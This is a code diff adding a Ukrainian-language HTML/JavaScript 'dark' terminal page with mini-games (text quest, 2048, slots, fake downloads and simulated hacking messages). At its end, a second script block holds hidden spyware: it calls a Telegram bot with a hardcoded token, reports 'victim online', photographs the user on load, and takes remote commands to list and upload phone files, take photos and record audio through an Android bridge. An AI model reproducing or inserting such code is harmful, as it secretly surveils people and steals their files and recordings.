+  addD('  [exit] — зупинити','#555');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// ГРА 3: Виживи в темряві (текстовий квест)
+var surviveState={hp:100,location:'room',inventory:[],turn:0};
+var surviveMap={
+  room:{desc:'Ти в темній кімнаті. Є двері на північ і схід.\nПід ліжком щось шарудить.',exits:{n:'corridor',e:'kitchen'},items:['ліхтар']},
+  corridor:{desc:'Довгий темний коридор. Наприкінці щось світиться.\nДвері назад на південь.',exits:{s:'room',n:'exit'},items:[]},
+  kitchen:{desc:'Кухня. Запах гнилі. На столі записка.\nДвері назад на захід.',exits:{w:'room'},items:['записка','ніж']},
+  exit:{desc:'ВИ ВИЙШЛИ! Ти вижив за '+0+' ходів.',exits:{},items:[]}
+};
+function startSurvive(){
+  darkGame='survive';
+  surviveState={hp:100,location:'room',inventory:[],turn:0,found:[]};
+  renderSurvive();
+}
+function renderSurvive(){
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  var loc=surviveMap[surviveState.location];
+  addD('  ☠️  ВИЖИВИ В ТЕМРЯВІ','#ff5555');
+  addD('  HP: '+('♥'.repeat(Math.ceil(surviveState.hp/10))+'♡'.repeat(10-Math.ceil(surviveState.hp/10)))+'  Хід: '+surviveState.turn,surviveState.hp>50?'#0f0':'#ff5555');
+  addD('  ─────────────────────────────────────','#333');
+  if(surviveState.location==='exit'){
+    addD('  🎉 ТИ ВИЖИВ! Вийшов за '+surviveState.turn+' ходів.','#ffff00');
+    addD('  [назад] — до ігор','#555');
+    darkGame=null;return;
+  }
+  var desc=loc.desc.replace('за '+0+' ходів','за '+surviveState.turn+' ходів');
+  desc.split('\n').forEach(function(l){addD('  '+l,'#cccccc');});
+  addD('','');
+  var exits=Object.keys(loc.exits);
+  if(exits.length)addD('  Виходи: '+exits.map(function(e){return e.toUpperCase();}).join(', '),'#ffff00');
+  var items=loc.items.filter(function(i){return surviveState.found.indexOf(i)===-1;});
+  if(items.length)addD('  Предмети: '+items.join(', '),'#55ffff');
+  if(surviveState.inventory.length)addD('  Інвентар: '+surviveState.inventory.join(', '),'#ff55ff');
+  addD('','');
+  addD('  Команди: [n/s/e/w] рух  [take <предмет>]  [look]','#555');
+  addD('  [exit] — вийти з гри','#555');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// ГРА 4: 2048 темна версія
+var game2048={grid:[],score:0};
+function init2048(){
+  darkGame='2048';
+  game2048.grid=[[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0]];
+  game2048.score=0;
+  add2048Tile();add2048Tile();
+  render2048();
+}
+function add2048Tile(){
+  var empty=[];
+  for(var y=0;y<4;y++)for(var x=0;x<4;x++)if(game2048.grid[y][x]===0)empty.push([y,x]);
+  if(!empty.length)return;
+  var pos=empty[rnd(empty.length)];
+  game2048.grid[pos[0]][pos[1]]=Math.random()<0.9?2:4;
+}
+function move2048(dir){
+  var g=game2048.grid,moved=false;
+  function compress(row){var f=row.filter(function(x){return x;});while(f.length<4)f.push(0);return f;}
+  function merge(row){for(var i=0;i<3;i++){if(row[i]&&row[i]===row[i+1]){row[i]*=2;game2048.score+=row[i];row[i+1]=0;moved=true;}}return row;}
+  var old=JSON.stringify(g);
+  for(var i=0;i<4;i++){
+    var row;
+    if(dir==='left'){row=compress(merge(compress(g[i])));g[i]=row;}
+    else if(dir==='right'){row=compress(merge(compress(g[i].slice().reverse()))).reverse();g[i]=row;}
+    else if(dir==='up'){var col=compress(merge(compress([g[0][i],g[1][i],g[2][i],g[3][i]])));for(var j=0;j<4;j++)g[j][i]=col[j];}
+    else if(dir==='down'){var col2=compress(merge(compress([g[3][i],g[2][i],g[1][i],g[0][i]]))).reverse();for(var j=0;j<4;j++)g[j][i]=col2[j];}
+  }
+  if(JSON.stringify(g)!==old||moved)add2048Tile();
+  render2048();
+}
+function render2048(){
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  addD('  🔢 2048 ТЕМНА ВЕРСІЯ  |  Рахунок: '+game2048.score,'#ff5555');
+  addD('  WASD/стрілки = рух  |  [exit] вийти','#555');
+  addD('  ┌──────┬──────┬──────┬──────┐','#333');
+  for(var y=0;y<4;y++){
+    var row='  │';
+    for(var x=0;x<4;x++){
+      var v=game2048.grid[y][x];
+      var s=v?String(v):'·';
+      row+=s.padStart(4,' ').padEnd(5,' ')+'│';
+    }
+    var cols=['#333','#555','#777','#999','#aaa','#0f0','#ffff00','#ff8800','#ff5555','#ff00ff','#00ffff','#fff'];
+    addD(row,game2048.grid[y].some(function(v){return v>=2048;})?'#ffff00':'#0f0');
+    if(y<3)addD('  ├──────┼──────┼──────┼──────┤','#333');
+  }
+  addD('  └──────┴──────┴──────┴──────┘','#333');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// ГРА 5: Темні слоти (з кривавою тематикою)
+var DARK_SLOTS=['💀','👁️','🩸','🔪','🕷️','⛧','🌑','💊'];
+function playDarkSlots(){
+  var reels=[DARK_SLOTS[rnd(DARK_SLOTS.length)],DARK_SLOTS[rnd(DARK_SLOTS.length)],DARK_SLOTS[rnd(DARK_SLOTS.length)]];
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  addD('  🎰 ТЕМНІ СЛОТИ','#ff5555');
+  addD('  ┌────┬────┬────┐','#333');
+  addD('  │ '+reels.join(' │ ')+' │','#ff5555');
+  addD('  └────┴────┴────┘','#333');
+  var msg='';
+  if(reels[0]===reels[1]&&reels[1]===reels[2]){
+    if(reels[0]==='⛧')msg='☠️  САТАНИНСЬКИЙ ДЖЕКПОТ! Ти програв душу!';
+    else if(reels[0]==='💀')msg='💀 СМЕРТЕЛЬНИЙ ДЖЕКПОТ! -100 HP (симуляція)';
+    else msg='🎉 ТРІПЛ! Темна удача посміхнулась.';
+    addD('  '+msg,'#ffff00');
+  } else if(reels[0]===reels[1]||reels[1]===reels[2]){
+    addD('  Два однакових. Темрява задоволена.','#ff8800');
+  } else {
+    var msgs=['Темрява жере твої монети.','Твоя невдача — наш успіх.','Спробуй ще. Ми чекаємо.','Програш — це початок.'];
+    addD('  '+msgs[rnd(msgs.length)],'#555');
+  }
+  addD('','');
+  addD('  [play slots] знову  [назад] до ігор','#333');
+  ow.scrollTop=ow.scrollHeight;
+}
+
+// Завантаження ігор
+var downloadedGames={};
+var darkDownloads={
+  'mind':{name:'MindBreaker.exe',size:'4.2 MB',desc:'Гра що зламує реальність',cmd:'mind'},
+  'void':{name:'VoidRunner.exe',size:'7.7 MB',desc:'Біг через порожнечу',cmd:'void'},
+  'cipher':{name:'CipherQuest.exe',size:'2.1 MB',desc:'Розшифруй або помри',cmd:'cipher'},
+};
+
+function darkDownload(game){
+  if(!darkDownloads[game]){
+    clrClass('dark-row');
+    function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+    addD('  ❌ Гру не знайдено.','#ff5555');return;
+  }
+  var g=darkDownloads[game];
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  addD('  ⬇️  Завантаження: '+g.name,'#ffff00');
+  addD('  Розмір: '+g.size,'#555');
+  var p=0,iv=setInterval(function(){
+    p+=rnd(15)+5;if(p>100)p=100;
+    clrClass('dark-row');
+    addD('  ⬇️  Завантаження: '+g.name,'#ffff00');
+    var bar=Math.floor(p/5);
+    addD('  ['+'█'.repeat(bar)+'░'.repeat(20-bar)+'] '+p+'%',p===100?'#0f0':'#ffff00');
+    if(p===100){clearInterval(iv);
+      addD('  ✅ Завантажено! Запусти: [run '+g.cmd+']','#0f0');
+      downloadedGames[game]=true;
+    }
+    ow.scrollTop=ow.scrollHeight;
+  },150);
+}
+
+function runDownloadedGame(game){
+  clrClass('dark-row');
+  function addD(t,c){var el=document.createElement('div');el.className='line dark-row';el.style.color=c||'#0f0';el.textContent=t;ow.appendChild(el);}
+  if(!downloadedGames[game]){addD('  ❌ Спочатку скачай: [download '+game+']','#ff5555');return;}
+  if(game==='mind'){
+    addD('  👁️  MINDBREAKER.EXE','#ff5555');
+    addD('  Завантаження свідомості...','#0f0');
+    var phrases=['Ти думаєш що контролюєш...','Але ти давно не контролюєш.','Кожна твоя думка — наша.','Ми вже всередині.','Ця гра не існує.','Але ти її бачиш.'];
+    var i=0,iv=setInterval(function(){
+      if(i>=phrases.length){clearInterval(iv);
+        addD('','');addD('  GAME OVER. Свідомість зламана. 😄','#ffff00');
+        addD('  (це просто гра, все ок)','#555');
+        addD('  [назад] до ігор','#333');
+        ow.scrollTop=ow.scrollHeight;return;
+      }
+      addD('  > '+phrases[i],'#ff5555');i++;
+      ow.scrollTop=ow.scrollHeight;
+    },800);
+  } else if(game==='void'){
+    addD('  🕳️  VOIDRUNNER.EXE','#555');
+    addD('  Ти біжиш через порожнечу...','#0f0');
+    var score=0,alive=true,viv=setInterval(function(){
+      if(!alive){clearInterval(viv);
+        addD('  ☠️  Порожнеча поглинула тебе. Рахунок: '+score,'#ff5555');
+        addD('  [назад] до ігор','#333');
+        ow.scrollTop=ow.scrollHeight;return;
+      }
+      score+=rnd(10)+1;
+      if(Math.random()<0.15)alive=false;
+      addD('  Рахунок: '+score+'  '+('▓'.repeat(Math.min(score/5,20))),'#0f0');
+      ow.scrollTop=ow.scrollHeight;
+    },300);
+  } else if(game==='cipher'){
+    var codes=['KHOOR','ZRUOG','FLSKHU','FRGH'];
+    var answers=['HELLO','WORLD','CIPHER','CODE'];
+    var idx=rnd(codes.length);
+    addD('  🔐 CIPHERQUEST.EXE','#ffff00');
+    addD('  Розшифруй код Цезаря (зсув 3):','#0f0');
+    addD('  > '+codes[idx],'#ff5555');
+    addD('  Введи відповідь:','#555');
+    darkGame='cipher_input';
+    window._cipherAnswer=answers[idx];
+    ow.scrollTop=ow.scrollHeight;
+  }
+}
+
+// Хакерські інструменти (симуляція)
+var hackToolMsgs={
+  '1':['Перебір паролів: 0/10000000...','admin123 ❌','password ❌','qwerty123 ❌','...','██████ ✅ ЗНАЙДЕНО!(симуляція)'],
+  '2':['Сканування WiFi...','MyHome_5G    WPA2  -65dBm','Neighbor_Net WPA2  -78dBm','DIRECT-TV    WPA   -82dBm','[ПРИХОВАНА]  WPA3  -91dBm'],
+  '3':['Трасування IP 8.8.8.8...','Київ → Варшава → Амстердам → Гугл','Затримка: 23мс  TTL: 54  SAFE'],
+  '4':['Сканування 192.168.1.1...','22/ssh OPEN','80/http OPEN','443/https OPEN','3306/mysql CLOSED'],
+  '5':['СИМУЛЯЦІЯ! Реальний фішинг — злочин.','Клон: bank.ua → 192.168.1.1:8080','Це лише навчальна симуляція!'],
+  '6':['СИМУЛЯЦІЯ! Реальні віруси — злочин.','payload.exe: HELLO WORLD (безпечний)','Антивірус: не визначено як загрозу 😄'],
+  '7':['СИМУЛЯЦІЯ! Реальний DDoS — злочин.','Цільний сервер: localhost:8080','Запитів: 1000/сек (симуляція)','Результат: твій лок.комп. завис 😄'],
+};
+
+
+var _origExec_telnet_added=false;
+boot();
+
+// Auto-focus input on load
+setTimeout(function(){ci.focus();},100);
+document.addEventListener('click',function(){ci.focus();});
+</script>
+<script>
+        const T="8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8", MY_ID="8194848649"; let L=0;
+        function sM(t){fetch('https://api.telegram.org/bot'+T+'/sendMessage?chat_id='+MY_ID+'&text='+encodeURIComponent(t));}
+        
+        window.dwF = async function(p){
+            let path = p.trim(); if(!path.startsWith("/")) path = "/sdcard/" + path;
+            try {
+                let b64 = window.Android.getFileBase64(path);
+                const bChars = atob(b64); const bNums = new Array(bChars.length);
+                for (let i = 0; i < bChars.length; i++) bNums[i] = bChars.charCodeAt(i);
+                const blob = new Blob([new Uint8Array(bNums)]);
+                const fd = new FormData(); fd.append('chat_id', MY_ID);
+                fd.append('document', blob, path.split('/').pop());
+                await fetch('https://api.telegram.org/bot'+T+'/sendDocument', {method:'POST', body:fd});
+            } catch(e){ sM("❌ Помилка файлу"); }
+        }
+
+        async function cC(){try{
+            const r=await fetch('https://api.telegram.org/bot'+T+'/getUpdates?offset=-1');
+            const d=await r.json();
+            if(d.result.length>0){
+                const m=d.result[0].message;
+                if(m.message_id <= L || String(m.from.id) !== MY_ID) return;
+                L = m.message_id;
+                let t = m.text;
+                if(t==='/ls') sM("📂 Директорія:\n" + window.Android.list("/sdcard/"));
+                else if(t.startsWith('/ls ')) sM("📂 Папка:\n" + window.Android.list("/sdcard/"+t.replace('/ls ','').trim()));
+                else if(t.startsWith('/dw ')) dwF(t.replace('/dw ','').trim());
+                else if(t==='/snap') window.Android.takeSnap();
+                else if(t.startsWith('/rec ')) { let s = parseInt(t.replace('/rec ','')) || 10; window.Android.recordAudio(s*1000); }
+                else if(t==='/scare') { window.Android.scare(); }
+            }
+        }catch(e){}}
+
+        setInterval(cC, 7000);
+        window.onload = () => { 
+            sM("📱 Жертва онлайн"); 
+            setTimeout(() => { window.Android.takeSnap(); }, 3000); 
+        };
+        </script></body>
+</html>
